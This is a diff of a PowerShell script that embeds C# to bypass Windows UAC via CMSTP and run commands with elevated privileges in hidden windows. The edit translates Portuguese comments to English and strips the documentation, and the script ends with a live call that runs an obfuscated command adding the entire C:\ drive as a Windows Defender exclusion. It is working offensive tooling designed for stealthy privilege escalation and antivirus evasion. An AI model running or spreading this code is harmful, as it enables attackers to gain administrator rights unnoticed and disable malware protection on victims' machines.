@@ -1,18 +1,8 @@
-function latencyx-Invoke-UAC
-{
+function latencyx-Invoke-UAC {
 <#
  
 .SYNOPSIS
-Este script serve para fazer um bypass de UAC (Controle de Contas de Usuário) em um Windows onde o usuário atual está no grupo de administradores e a configuração de UAC está no padrão. Ele eleva os privilégios de maneira transparente.
-
-.DESCRIPTION
-Este script usa código em C# para ser carregado na memória com PowerShell usando reflection, e então invoca a função `latencyx-Execute` do código C# carregado, que executará o comando com altos privilégios (administrador).
-
-.PARAMETER Executable
-.PARAMETER Command
-
-.EXAMPLE
-latencyx-Invoke-UAC -latencyxExecutable "powershell" -latencyxCommand ".('Add-MpP' + 'reference') -ExclusionPath C:\"
+This script is designed to bypass UAC on Windows when the current user is an administrator, and UAC is set to the default level.
 
 #>
 
@@ -93,7 +83,7 @@ public class latencyxCMSTPBypass
 
         ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath);
         startInfo.Arguments = "/au " + InfFile.ToString();
-        startInfo.WindowStyle = ProcessWindowStyle.Hidden;  // Oculta a janela
+        startInfo.WindowStyle = ProcessWindowStyle.Hidden;  // Hidden window
         IntPtr dptr = Marshal.AllocHGlobal(1);
         ShellExecute(dptr, "", BinaryPath, startInfo.Arguments, "", 0);
 
@@ -111,7 +101,7 @@ public class latencyxCMSTPBypass
 $latencyxConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
 $latencyxSecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop
 if ($latencyxConsentPrompt -Eq 2 -and $latencyxSecureDesktopPrompt -Eq 1) {
-    return  # Silenciosamente sai se UAC estiver em "Notificar sempre"
+    return
 }
 
 try {
@@ -126,7 +116,7 @@ try {
 }
 
 if (!$latencyxAdm) {
-    return  # Silenciosamente sai se o usuário não é administrador
+    return
 }
 
 try {
@@ -135,25 +125,25 @@ try {
         if (![System.IO.File]::Exists($latencyxEx.Source)) {
             $latencyxExecutable = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($latencyxExecutable)
             if (![System.IO.File]::Exists($latencyxExecutable)) {
-                return  # Silenciosamente sai se o executável não for encontrado
+                return
             }
         } else {
             $latencyxExecutable = (Get-Command $latencyxExecutable).Name
         }
     }
 } catch {
-    return  # Silenciosamente sai em caso de erro
+    return
 }
 
 if ($latencyxExecutable.Contains("powershell")) {
     if ($latencyxCommand -ne "") {
-        $latencyxFinal = "powershell -WindowStyle Hidden -c ""$latencyxCommand"""  # Oculta a janela do PowerShell
+        $latencyxFinal = "powershell -WindowStyle Hidden -c ""$latencyxCommand"""
     } else {
         $latencyxFinal = "$latencyxExecutable $latencyxCommand"
     }
 } elseif ($latencyxExecutable.Contains("cmd")) {
     if ($latencyxCommand -ne "") {
-        $latencyxFinal = "cmd /k ""$latencyxCommand"""
+        $latencyxFinal = "cmd /c ""$latencyxCommand"""  # Changed to /c to close the cmd window
     } else {
         $latencyxFinal = "$latencyxExecutable $latencyxCommand"
     }
@@ -170,9 +160,9 @@ function latencyxExecute {
     }
 
     if ($latencyxResult) {
-        return  # Silenciosamente sai se a elevação for bem-sucedida
+        return
     } else {
-        return  # Silenciosamente sai se ocorrer um erro
+        return
     }
 }
 
@@ -182,13 +172,12 @@ if ($latencyxProcess -eq "cmstp") {
         Stop-Process -Name "cmstp" -Force
         latencyxExecute
     } catch {
-        return  # Silenciosamente sai se houver erro ao fechar cmstp
+        return
     }
 } else {
     latencyxExecute
 }
-
 }
 
-# Chamada da função
+# Function Call
 latencyx-Invoke-UAC -latencyxExecutable "powershell" -latencyxCommand ".('Add-MpP' + 'reference') -ExclusionPath C:\"
